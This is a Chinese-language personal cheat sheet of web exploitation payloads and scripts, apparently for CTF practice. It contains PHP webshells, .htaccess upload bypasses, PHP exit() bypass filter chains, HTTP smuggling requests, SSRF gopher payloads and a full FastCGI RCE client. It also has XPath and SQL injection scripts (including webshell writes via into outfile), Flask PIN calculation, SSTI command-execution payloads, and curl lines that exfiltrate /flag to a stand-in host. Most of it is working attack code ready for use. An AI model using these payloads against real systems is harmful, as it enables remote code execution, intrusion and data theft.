




# 文件上传

## 后缀
```bash
    "php",
    "php3",
    "php4",
    "php5",
    "php7",
    "pht",
    "phtm",
    "phtml",
    "phar",
    "phps",
```

## .htaccess
先传base64编码后的`1.jpg`,再传.htaccess
```php
<?php @eval($_GET[0]);
```

```php
AddType application/x-httpd-php .jpg
php_value auto_append_fi\
le "php://filter/convert.base64-decode/resource=1.jpg"
```


## postgreSQL语法

![image.png|500](https://gitee.com/leiye87/typora_picture/raw/master/20231207180852.png)

![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20231207180952.png)

## php死亡绕过

- 第一种情况
`file_put_contents($filename,"<?php exit();".$content);`

```php
filename=php://filter/convert.base64-decode/resource=shell.php
#加a是为了与exit();形成4字节
content=aPD9waHAgQGV2YWwoJF9HRVRbMF0pOw==
```

```php
filename=php://filter/convert.string.rot13/resource=shell.php
content=<?cuc cucvasb();?>
```

```php
filename=php://filter/string.strip_tags|convert.base64-decode/resource=shell.php
content=?>PD9waHAgcGhwaW5mbygpOz8+
```

- 第二种情况
`file_put_contents($content,"<?php exit();".$content);`

```php
content=php://filter/string.rot13|<?cuc cucvasb();?>|/resource=shell.php
```

```php
content=php://filter/zlib.deflate|string.tolower|zlib.inflate|?><?php%0deval($_GET[1]);?>/resource=shell.php
```

```php
content=php://filter/string.strip_tags|convert.base64-decode/resource=?>PD9waHAgcGhwaW5mbygpOz8+/../shell.php
```

- 第三种情况

```php
filename=.htaccess
content=php_value auto_prepend_file D:\\phpstudy_pro\\www\\flag.php%0a%23\
```
# JWT
爆破,jwt_tool在`CTF_TOOL`下

```bash
python .\jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJzdWIiOiI0OTI5MSIsImlhdCI6MTcwMDU0NzM5MSwiZXhwIjoxNzAxMTUyMTkxfQ.hKwliNI5OGbTrpcrxRZ8Bvq978ur4o483jmD2CFbbbhO5V9_3HHNTK6YZ9-YaE4lFOnTeRjYQkyKYsPprFAr0g -C -d D:\dict\wordlists\rockyou.txt
```

空算法攻击



## http请求走私
> HTTP请求走私漏洞是因为前端的反向代理服务器和后端的Web服务器，对同一个请求的理解不一致造成的。因此，针对同一个HTTP请求，不同的服务器可能会产生不同的处理结果，这样就产生了安全风险。


前后端对数据的结束位置有多个标头 `Content-Length` `Transfer-Encoding`来确定

> CL.TE：前端服务器使用Content-Length标头，而后端服务器使用Transfer-Encoding标头。
> TE.CL：前端服务器使用Transfer-Encoding标头，而后端服务器使用Content-Length标头。
> TE.TE：前端服务器和后端服务器都支持Transfer-Encoding标头，但是可以通过对标头进行某种方式的混淆来诱导其中一台服务器不对其进行处理


### HTTP2降级走私

#### H2.CL Desync
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20231120003137.png)

```http
GET /admin HTTP/2
Host: 47.108.56.168:20231
Cookie: session=MTcwMDQwMzE0MHwzQkFoUVR6VGRNdXVoN1N6ckctMkIxVkRTd2lXU3Q0OG03bVZUd3FicWlaUG90by1WQUtWTmQyTWN4UXIyOUtDWld5ckhLUk9zcy05dEhyOVozUUd0T0VOVkpCcnBqY1h86mqqXvwUYQsIJ5OSSuJDIbysGI37BJ4sbfZC99ajuwo=
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Length: 8

AbcdGET /admin http/1.1: 
Host: 47.108.56.168:20231


```


## python文件上传

```python
import requests
proxies={'http':'http://127.0.0.1:8081','https':'https://127.0.0.1:8081'}

file_path="C:\\Users\\20925\\Desktop\\upload\\a.go"
file={
    "file":open(file_path,"rb")
}
data={
    "user":"admin"
}
requests.post("http://127.0.0.1",files=file,data=data,proxies=proxies)
```

## 文件包含
后缀绕过
远程文件包含url+?或者#

前缀绕过
compress.zlib://data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b

远程文件包含绕过allow_url
开启smb服务器

## oracle注入
`C:\Users\20925\Desktop\study\attachment\Oracle数据库注入全方位利用 - 先知社区.mhtml`
## php反序列化
`C:\Users\20925\Desktop\study\RT\php反序列化总结 - lewiserii's blog.mhtml`
## 代码注入
无字母数字

异或
```php
$__=("#"^"|"); // _
$__.=("."^"~"); // _P
$__.=("/"^"`"); // _PO
$__.=("|"^"/"); // _POS
$__.=("{"^"/"); // _POST 
$$__[_]($$__[__]); // $_POST[_]($_POST[__]);


//一行
$__=("#"^"|");$__.=("."^"~");$__.=("/"^"`");$__.=("|"^"/");$__.=("{"^"/");$$__[_]($$__[__]);
```

脚本
```php
<?php

/*author yu22x*/

$myfile = fopen("xor_rce.txt", "w");
$contents="";
for ($i=0; $i < 256; $i++) { 
	for ($j=0; $j <256 ; $j++) { 

		if($i<16){
			$hex_i='0'.dechex($i);
		}
		else{
			$hex_i=dechex($i);
		}
		if($j<16){
			$hex_j='0'.dechex($j);
		}
		else{
			$hex_j=dechex($j);
		}
		$preg = '/[a-z0-9]/i'; //根据题目给的正则表达式修改即可
		if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
					echo "";
    }
  
		else{
		$a='%'.$hex_i;
		$b='%'.$hex_j;
		$c=(urldecode($a)^urldecode($b));
		if (ord($c)>=32&ord($c)<=126) {
			$contents=$contents.$c." ".$a." ".$b."\n";
		}
	}

}
}
fwrite($myfile,$contents);
fclose($myfile);
```

取反
```php

```

## SSRF

### ip

```
127.0.0.1
localhost
0.0.0.0
::ffff:127.0.0.1
[::1]
::1
127.0.0.2
16进制

```
php302跳转
```php
<?php

$redirectUrl = "https://example.com/new-page";
header("Location: " . $redirectUrl, true, 302);
exit; // 确保在发送头部之后结束脚本的执行
?>
```


#ssrf 

工具`https://github.com/tarunkant/Gopherus` 安装在ubuntu上


编码
```python
from urllib.parse import quote, unquote, urlencode
file= open('1.txt','rb')
payload= file.read()
payload= quote(payload).replace("%0A","%0A%0D")
print("gopher://127.0.0.1:9000/_"+quote(payload))
```

- 文件读取
`file:///etc/passwd`
- gopher来请求http
`gopher://127.0.0.1:80/_POST%252520%25252Fflag.php%252520HTTP%25252F1.1%25250D%25250AHost%25253A%252520127.0.0.1%25253A80%25250D%25250AContent-Type%25253A%252520application%25252Fx-www-form-urlencoded%25250D%25250AContent-Length%25253A%25252036%25250D%25250A%25250D%25250Akey%25253D02127f6ffde0661a73e92b228053bdc1`

http->gopher
urlencode->%0A-(%0D%0A)->urlencode->urlencode

- dict 扫描端口
`dict://127.0.0.1:<port>`

- 打fast-cgi

最后的payload
```bash
gopher://127.0.0.1:9000/_%2501%2501%259AP%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%259AP%2501%25DB%2500%2500%2511%250BGATEWAY_INTERFACEFastCGI/1.0%250E%2504REQUEST_METHODPOST%250F%2517SCRIPT_FILENAME/var/www/html/index.php%250B%2517SCRIPT_NAME/var/www/html/index.php%250C%2500QUERY_STRING%250B%2517REQUEST_URI/var/www/html/index.php%250D%2501DOCUMENT_ROOT/%250F%250ESERVER_SOFTWAREphp/fcgiclient%250B%2509REMOTE_ADDR127.0.0.1%250B%2504REMOTE_PORT9985%250B%2509SERVER_ADDR127.0.0.1%250B%2502SERVER_PORT80%250B%2509SERVER_NAMElocalhost%250F%2508SERVER_PROTOCOLHTTP/1.1%250C%2510CONTENT_TYPEapplication/text%250E%2502CONTENT_LENGTH61%2509%251FPHP_VALUEauto_prepend_file%2520%253D%2520php%253A//input%250F%2516PHP_ADMIN_VALUEallow_url_include%2520%253D%2520On%2501%2504%259AP%2500%2500%2500%2500%2501%2505%259AP%2500%253D%2500%2500%253C%253Fphp%2520system%2528%2527cat%2520/flag_489c5bf04ea0c6f6fcc16a958df58401%2527%2529%253B%253F%253E%2501%2505%259AP%2500%2500%2500%2500
```

`python exp.py -c "<?php phpinfo();?>" -p 4444 127.0.0.1 /var/www/html/index.php`

本地`nc -lnvp 4444 >1.txt`接收payload

##### code
```python
import socket
import random
import argparse
import sys
from io import BytesIO
# Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client
PY2 = True if sys.version_info.major == 2 else False
def bchr(i):
    if PY2:
        return force_bytes(chr(i))
    else:
        return bytes([i])
def bord(c):
    if isinstance(c, int):
        return c
    else:
        return ord(c)
def force_bytes(s):
    if isinstance(s, bytes):
        return s
    else:
        return s.encode('utf-8', 'strict')
def force_text(s):
    if issubclass(type(s), str):
        return s
    if isinstance(s, bytes):
        s = str(s, 'utf-8', 'strict')
    else:
        s = str(s)
    return s
class FastCGIClient:
    """A Fast-CGI Client for Python"""
    # private
    __FCGI_VERSION = 1
    __FCGI_ROLE_RESPONDER = 1
    __FCGI_ROLE_AUTHORIZER = 2
    __FCGI_ROLE_FILTER = 3
    __FCGI_TYPE_BEGIN = 1
    __FCGI_TYPE_ABORT = 2
    __FCGI_TYPE_END = 3
    __FCGI_TYPE_PARAMS = 4
    __FCGI_TYPE_STDIN = 5
    __FCGI_TYPE_STDOUT = 6
    __FCGI_TYPE_STDERR = 7
    __FCGI_TYPE_DATA = 8
    __FCGI_TYPE_GETVALUES = 9
    __FCGI_TYPE_GETVALUES_RESULT = 10
    __FCGI_TYPE_UNKOWNTYPE = 11
    __FCGI_HEADER_SIZE = 8
    # request state
    FCGI_STATE_SEND = 1
    FCGI_STATE_ERROR = 2
    FCGI_STATE_SUCCESS = 3
    def __init__(self, host, port, timeout, keepalive):
        self.host = host
        self.port = port
        self.timeout = timeout
        if keepalive:
            self.keepalive = 1
        else:
            self.keepalive = 0
        self.sock = None
        self.requests = dict()
    def __connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(self.timeout)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # if self.keepalive:
        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)
        # else:
        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)
        try:
            self.sock.connect((self.host, int(self.port)))
        except socket.error as msg:
            self.sock.close()
            self.sock = None
            print(repr(msg))
            return False
        return True
    def __encodeFastCGIRecord(self, fcgi_type, content, requestid):
        length = len(content)
        buf = bchr(FastCGIClient.__FCGI_VERSION) \
               + bchr(fcgi_type) \
               + bchr((requestid >> 8) & 0xFF) \
               + bchr(requestid & 0xFF) \
               + bchr((length >> 8) & 0xFF) \
               + bchr(length & 0xFF) \
               + bchr(0) \
               + bchr(0) \
               + content
        return buf
    def __encodeNameValueParams(self, name, value):
        nLen = len(name)
        vLen = len(value)
        record = b''
        if nLen < 128:
            record += bchr(nLen)
        else:
            record += bchr((nLen >> 24) | 0x80) \
                      + bchr((nLen >> 16) & 0xFF) \
                      + bchr((nLen >> 8) & 0xFF) \
                      + bchr(nLen & 0xFF)
        if vLen < 128:
            record += bchr(vLen)
        else:
            record += bchr((vLen >> 24) | 0x80) \
                      + bchr((vLen >> 16) & 0xFF) \
                      + bchr((vLen >> 8) & 0xFF) \
                      + bchr(vLen & 0xFF)
        return record + name + value
    def __decodeFastCGIHeader(self, stream):
        header = dict()
        header['version'] = bord(stream[0])
        header['type'] = bord(stream[1])
        header['requestId'] = (bord(stream[2]) << 8) + bord(stream[3])
        header['contentLength'] = (bord(stream[4]) << 8) + bord(stream[5])
        header['paddingLength'] = bord(stream[6])
        header['reserved'] = bord(stream[7])
        return header
    def __decodeFastCGIRecord(self, buffer):
        header = buffer.read(int(self.__FCGI_HEADER_SIZE))
        if not header:
            return False
        else:
            record = self.__decodeFastCGIHeader(header)
            record['content'] = b''
            if 'contentLength' in record.keys():
                contentLength = int(record['contentLength'])
                record['content'] += buffer.read(contentLength)
            if 'paddingLength' in record.keys():
                skiped = buffer.read(int(record['paddingLength']))
            return record
    def request(self, nameValuePairs={}, post=''):
        if not self.__connect():
            print('connect failure! please check your fasctcgi-server !!')
            return
        requestId = random.randint(1, (1 << 16) - 1)
        self.requests[requestId] = dict()
        request = b""
        beginFCGIRecordContent = bchr(0) \
                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \
                                 + bchr(self.keepalive) \
                                 + bchr(0) * 5
        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,
                                              beginFCGIRecordContent, requestId)
        paramsRecord = b''
        if nameValuePairs:
            for (name, value) in nameValuePairs.items():
                name = force_bytes(name)
                value = force_bytes(value)
                paramsRecord += self.__encodeNameValueParams(name, value)
        if paramsRecord:
            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)
        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId)
        if post:
            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)
        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId)
        self.sock.send(request)
        self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND
        self.requests[requestId]['response'] = b''
        return self.__waitForResponse(requestId)
    def __waitForResponse(self, requestId):
        data = b''
        while True:
            buf = self.sock.recv(512)
            if not len(buf):
                break
            data += buf
        data = BytesIO(data)
        while True:
            response = self.__decodeFastCGIRecord(data)
            if not response:
                break
            if response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \
                    or response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:
                if response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:
                    self.requests['state'] = FastCGIClient.FCGI_STATE_ERROR
                if requestId == int(response['requestId']):
                    self.requests[requestId]['response'] += response['content']
            if response['type'] == FastCGIClient.FCGI_STATE_SUCCESS:
                self.requests[requestId]
        return self.requests[requestId]['response']
    def __repr__(self):
        return "fastcgi connect host:{} port:{}".format(self.host, self.port)
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Php-fpm code execution vulnerability client.')
    parser.add_argument('host', help='Target host, such as 127.0.0.1')
    parser.add_argument('file', help='A php file absolute path, such as /usr/local/lib/php/System.php')
    parser.add_argument('-c', '--code', help='What php code your want to execute', default='<?php phpinfo(); exit; ?>')
    parser.add_argument('-p', '--port', help='FastCGI port', default=9000, type=int)
    args = parser.parse_args()
    client = FastCGIClient(args.host, args.port, 3, 0)
    params = dict()
    documentRoot = "/"
    uri = args.file
    content = args.code
    params = {
        'GATEWAY_INTERFACE': 'FastCGI/1.0',
        'REQUEST_METHOD': 'POST',
        'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'),
        'SCRIPT_NAME': uri,
        'QUERY_STRING': '',
        'REQUEST_URI': uri,
        'DOCUMENT_ROOT': documentRoot,
        'SERVER_SOFTWARE': 'php/fcgiclient',
        'REMOTE_ADDR': '127.0.0.1',
        'REMOTE_PORT': '9985',
        'SERVER_ADDR': '127.0.0.1',
        'SERVER_PORT': '80',
        'SERVER_NAME': "localhost",
        'SERVER_PROTOCOL': 'HTTP/1.1',
        'CONTENT_TYPE': 'application/text',
        'CONTENT_LENGTH': "%d" % len(content),
        'PHP_VALUE': 'auto_prepend_file = php://input',
        'PHP_ADMIN_VALUE': 'allow_url_include = On'
    }
    response = client.request(params, content)
```

打redis


- 打redis
## php原生类利用


## XPATH注入

```
1、注入点：URL、表单或其它信息上附带恶意的 XPath 查询代码
2、注入漏洞验证：输入id=1'、id=-1看页面是否返回报错信息
3、注入万能公式：id=1' or 1=1 or ''='
4、万能访问xml文档所有节点的payload:']|//*|//*['
```



https://xz.aliyun.com/t/7791?page=1
盲注脚本
```python
import requests
import time
url ='http://6d4635b8-447b-440a-be15-2abe57435b8c.node4.buuoj.cn:81/'


strs ='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'


flag =''
for i in range(1,100):
    for j in strs:

        #猜测根节点名称
        # payload_1 = {"username":"<username>'or substring(name(/*[1]), {}, 1)='{}'  or ''='</username><password>3123</password>".format(i,j),"password":123}
        #猜测子节点名称
        # payload_2 = "<username>'or substring(name(/root/*[1]), {}, 1)='{}'  or ''='</username><password>3123</password><token>{}</token>".format(i,j,token[0])

        #猜测accounts的节点
        # payload_3 ="<username>'or substring(name(/root/accounts/*[1]), {}, 1)='{}'  or ''='</username><password>3123</password><token>{}</token>".format(i,j,token[0])

        #猜测user节点
        # payload_4 ="<username>'or substring(name(/root/accounts/user/*[2]), {}, 1)='{}'  or ''='</username><password>3123</password><token>{}</token>".format(i,j,token[0])

        #跑用户名和密码
        # payload_username ="<username>'or substring(/accounts/user[1]/username/text(), {}, 1)='{}'  or ''='".format(i,j)
        payload_username ="<username>'or substring(/accounts/user[1]/password/text(), {}, 1)='{}'  or ''='".format(i,j)
        data={
            "username":payload_username,
            "password":123,
            "submit":"1"
        }
        #
        # payload_password ="<username>'or substring(/root/accounts/user[2]/password/text(), {}, 1)='{}'  or ''='</username><password>3123</password><token>{}</token>".format(i,j,token[0])


        print(payload_username)
        r = requests.post(url=url,data=data)
        time.sleep(0.1)
        # print(r.text)
#003d7628772d6b57fec5f30ccbc82be1

        if "登录成功" in r.text:
            flag+=j
            print(flag)
            break

    if "登录失败" in r.text:
        break

print(flag)

```
# Flask PIN值计算
```python
import hashlib
from itertools import chain
 
probably_public_bits = [
    'root'  # username 可通过/etc/passwd获取
    'flask.app',  # modname默认值
    'Flask',  # 默认值 getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.10/site-packages/flask/app.py'  # 路径 可报错得到  getattr(mod, '__file__', None)
]
 
private_bits = [
    '77154419714822',  # /sys/class/net/eth0/address mac地址十进制
    '96cec10d3d9307792745ec3b85c89620docker-ad2da0cd088fbb15c29dfb699899a4d50788db7f47701e9ad0ff4c79169249b4.scope'
 
    # 字符串合并：首先读取文件内容 /etc/machine-id(docker不用看) /proc/sys/kernel/random/boot_id   /proc/self/cgroup
    # 有machine-id 那就拼接machine-id + /proc/self/cgroup  否则 /proc/sys/kernel/random/boot_id + /proc/self/cgroup
]
 
# 下面为源码里面抄的，不需要修改
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
 
cookie_name = '__wzd' + h.hexdigest()[:20]
 
num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]
 
rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num
 
print(rv)
```


# 浏览器控制台上传文件
```js
fetch("http://localhost:18044/upload.php", {
  "headers": {
    "accept": "*/*",
    "accept-language": "zh-CN,zh;q=0.9",
    "content-type": "multipart/form-data; boundary=----WebKitFormBoundarypD5Oqfq5VcOyM095",
    "sec-ch-ua": "\"Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"115\", \"Chromium\";v=\"115\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Windows\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin"
  },
  "referrer": "http://localhost:18044/",
  "referrerPolicy": "strict-origin-when-cross-origin",
  "body": "------WebKitFormBoundarypD5Oqfq5VcOyM095\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.png.php\"\r\nContent-Type: image/png\r\n\r\n<?php eval($_GET['cmd']); ?>\r\n------WebKitFormBoundarypD5Oqfq5VcOyM095--\r\n",
  "method": "POST",
  "mode": "cors",
  "credentials": "omit"
});
```
# 任意文件读取(CTF)
```python
run.sh
run.bash
.dockerfile
.Dockerfile
/flag
/flag.txt
```
# 关键字绕过
- 编码
```python
unicode
hex

```
# 命令执行

| Purpose of command | Linux | Windows |
| ------------------ | ----- | ------- |
|     Name of current user               |   whoami    |   whoami      |
|Operating system	|uname -a|	ver
|Network configuration	|ifconfig	|ipconfig /all
|Network connections|	netstat -an|	netstat -an
|Running processes|	ps -ef|	tasklist

- 命令连接
```python
` & || | $()
#换行
%0A
#回车
%0d
#局部变量
a=l;b=s;$a$b
#curl外带
curl `whoami`.xxx.com
curl http://xxx.com -d@/flag
curl http://xxx.com --post-data $(/readflag)

```
- 使用`\`换行符
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230530132922.png)

长度4命令绕过
##### script
```python
#-*-coding:utf8-*-
import requests as r
from time import sleep
import random
import hashlib
target = 'http://172.28.149.62/'

 

 

 

cmd = target + '?1='
 
# payload某些位置的可选字符
pos0 = random.choice('efgh')
pos1 = random.choice('hkpq')
pos2 = 'x'  # 随意选择字符
 
payload = [
    '>dir',
    # 创建名为 dir 的文件
 
    '>%s\>' % pos0,
    # 假设pos0选择 f , 创建名为 f> 的文件
 
    '>%st-' % pos1,
    # 假设pos1选择 k , 创建名为 kt- 的文件,必须加个pos1，
    # 因为alphabetical序中t>s
 
    '>sl',
    # 创建名为 >sl 的文件；到此处有四个文件，
    # ls 的结果会是：dir f> kt- sl
 
    '*>v',
    # 前文提到， * 相当于 `ls` ，那么这条命令等价于 `dir f> kt- sl`>v ，
    #  前面提到dir是不换行的，所以这时会创建文件 v 并写入 f> kt- sl
    # 非常奇妙，这里的文件名是 v ，只能是v ，没有可选字符
 
    '>rev',
    # 创建名为 rev 的文件，这时当前目录下 ls 的结果是： dir f> kt- rev sl v
 
    '*v>%s' % pos2,
    # 魔法发生在这里： *v 相当于 rev v ，* 看作通配符。前文也提过了，体会一下。
    # 这时pos2文件，也就是 g 文件内容是文件v内容的反转： ls -tk > f
 
    # 续行分割     # echo PD89YCRfR0VUWzBdYDs=|base64    -d>a.php
    '>p',
    '>ph\\',
    '>a.\\',
    '>\>\\',
    '>-d\\',
    '>\\'+chr(9)+'\\',
    '>64\\',
    '>se\\',
    '>ba\\',
    '>\|\\',
    '>s=\\',
    '>YD\\',
    '>Bd\\',
    '>Wz\\',
    '>VU\\',
    '>R0\\',
    '>Rf\\',
    '>YC\\',
    '>89\\',
    '>PD\\',
    '>\ \\',
    '>ho\\',
    '>ec\\',
    'sh ' + pos2,
    'sh ' + pos0,
]
 
for i in payload:
    assert len(i) <= 4
    s = r.get(cmd + i)
    print('[%d]' % s.status_code, s.url)
    sleep(0.1)
s = r.get(cmd+'sh '+pos0)
print('[%d]' % s.status_code, s.url)
print(s.text)
```

# Nodejs


[原型链污染](https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x05-code-breaking-2018-thejs)



# SQL Injection

##### payload
```python

1 oorr case when(substr((selselectect group_concat(flag) from flag) from {} foorr 1 )='{}') then sleep(5) else 1 end -

# 宽字节注入
id=%df' union select 1,0x61646d696e,group_concat(column_name) from information_schema.columns where table_name = char(102,49,52,103)

# 布尔盲注
id=1' and ascii(substr(database(),1,1))>114
#时间盲注
id=1' and if(ascii(substr(database(),1,1))>114,sleep(3),null)
#报错注入
id=1' and extractvalue(1,concat(0x7e,(select database())))
#写🐎
id=1' union select 1,2,"<?php @eval($_GET['string'])?>" into outfile xxx.php
#读取文件
id=1' union select load_file('/etc/passwd')
#绕过空格
id=1'^(ascii(mid((select(GROUP_CONCAT(TABLE_NAME))from(information_schema.TABLES)where(TABLE_SCHEMA=database())),1,1))=1)='1'
#绕过逗号
id=1' union select * from (select 1)a join (select 2)b join (select 3)c
#正则表达式注入(盲注)
id=' or (length(database())) regexp 8 --+  判断数字
2. `=`过滤，使用`like`绕过
3. 空格过滤，使用制表符`tab`或换行符绕过
4. 引号过滤，使用16进制数或char函数绕过
5. addslashes过滤，宽字节`%df`注入

#堆叠注入
1'; show tables;%23

#预处理绕过字符限制
Set @a=concat('selec','t from xxx');
prepare h from @a;
execute @a;
#16进制绕过
将 select * from xxx 进行16进制编码得到
73656c656374202a2066726f6d20787878
#则公式变为
Set @a=0x73656c656374202a2066726f6d20787878;
prepare h from @a;
execute @a;

#16进制写马
Set @a=0x(转16进制 select "<?php eval($_POST[1];?>" into outfile "/var/www/html/a.php";);
prepare h from @a;
execute @a;

#handler注入
1';handler `1919810931114514` open as aaa;handler aaa read first;handler aaa read next;

#引号被过滤
select * from user where username='flag'
select * from user where username=0x666c6167

```



##### 偏移注入
```sql
//使用 <table_name>.*代替字段名
select * from table; ==>
```

> sleep 可以用benchmark代替
>  
> <,> 可以用least(),greatest()代替
>  
> =,in 可以用like代替
>  
> substr 可以用mid代替
> 
> 空格 可以用/\*\*/代替

## mysql
```sql
//查询库名
select group_concat(SCHEMA_NAME)from(information_schema.schemata)
//查询库中所有表名
select group_concat(table_name)from(information_schema.tables)where(table_schema='myapp')
//查询所有字段名
select group_concat(column_name)from(information_schema.columns)where((table_schema='myapp')and(table_name='user'))#


```

# SSTI
#SSTI 

[寻找类文章](https://xz.aliyun.com/t/11090#toc-15)

```shell
{%print lipsum|attr("\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f")|attr("\u0067\u0065\u0074")("os")|attr("\u0070\u006f\u0070\u0065\u006e")("cat /flllaag?txt")|attr("\u0072\u0065\u0061\u0064")()%}
```

```shell
//base64 flllaag.txt
{% print []|attr("\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f")|attr("\x5f\x5f\x62\x61\x73\x65\x5f\x5f")|attr("\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f")()|attr("\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f")(415)("\x62\x61\x73\x65\x36\x34\x20\x66\x6c\x6c\x6c\x61\x61\x67\x2e\x74\x78\x74",shell=True,stdout=-1)|attr("\x63\x6f\x6d\x6d\x75\x6e\x69\x63\x61\x74\x65")() %}
```

```python

```


```
__class__
  查看对象所在的类
__mro__
  查看继承关系和调用顺序，返回元组
__base__
  返回基类
__bases__
  返回基类元组
__subclasses__()
  返回子类列表
__init__
  调用初始化函数，可以用来跳到__globals__
__globals__
  返回函数所在的全局命名空间所定义的全局变量，返回字典
__builtins__
  返回内建内建名称空间字典
__dic__
  返回类的静态函数、类函数、普通函数、全局变量以及一些内置的属性
__getattribute__()
  实例、类、函数都具有的魔术方法。事实上，在实例化的对象进行.操作的时候（形如:a.xxx/a.xxx() 都会自动去调用此方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。
__getitem__()
  调用字典中的键值，其实就是调用这个魔术方法，比如a['b']，就是a.__getitem__('b')
__builtins__
  内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。
__import__
  动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__('os').popen('ls').read()]
__str__()
  返回描写这个对象的字符串，可以理解成就是打印出来。
url_for
  flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app
get_flashed_messages
  flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app
lipsum
  flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：{{lipsum.__globals__['os'].popen('ls').read()}} {{cycler.__init__.__globals__.os.popen('ls').read()}}
current_app
  应用上下文，一个全局变量
request
  可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__['__builtins__'].open('/proc\self\fd/3').read()
request.args.x1
  get传参
request.values.x1
  所有参数
request.cookies
  cookies参数
request.headers
  请求头参数
request.form.x1
  post传参(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)
request.data
  post传参(Content-Type:a/b)
request.json
  post传json(Content-Type:application/json)
config
  当前application的所有配置。此外，也可以{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
```



```python
# " [] _ 
{%25print(''|attr('%25c%25c%25c%25c%25c%25c%25c%25c%25c'|format(95,95,99,108,97,115,115,95,95)))%25}


{{lipsum.__globals__.__builtins__['__import__']('os').popen('ls').read()}}


#request
{{request[request.cookies['a']][request.cookies['b']][request.cookies['c']][request.cookies['d']][request.cookies['e']][request.cookies['f']]('subprocess')[request.cookies['g']](request.cookies['h'],shell=True)}}
# cookie 传入 "a": "__class__"_ "b": "_get_file_stream"_ "c": "im_func"_ "d": "func_globals"_ _ _ _"e": "__builtins__""f": "__import__""g": "check_output""h": cmd

```

# LFI



[支持的协议和封装协议](https://www.php.net/manual/zh/wrappers.php) //官方文档

```php
php://filter/read=convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php

```

*payload*
```shell
data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOyA/Pg==
```
##### 伪协议
>   -   [file://](https://www.php.net/manual/zh/wrappers.file.php) — 访问本地文件系统
>   -   [http://](https://www.php.net/manual/zh/wrappers.http.php) — 访问 HTTP(s) 网址
>   -   [ftp://](https://www.php.net/manual/zh/wrappers.ftp.php) — 访问 FTP(s) URLs
>   -   [php://](https://www.php.net/manual/zh/wrappers.php.php) — 访问各个输入/输出流（I/O streams）
>   -   [zlib://](https://www.php.net/manual/zh/wrappers.compression.php) — 压缩流
>   -   [data://](https://www.php.net/manual/zh/wrappers.data.php) — 数据（RFC 2397）
>   -   [glob://](https://www.php.net/manual/zh/wrappers.glob.php) — 查找匹配的文件路径模式
>   -   [phar://](https://www.php.net/manual/zh/wrappers.phar.php) — PHP 归档
>   -   [ssh2://](https://www.php.net/manual/zh/wrappers.ssh2.php) — Secure Shell 2
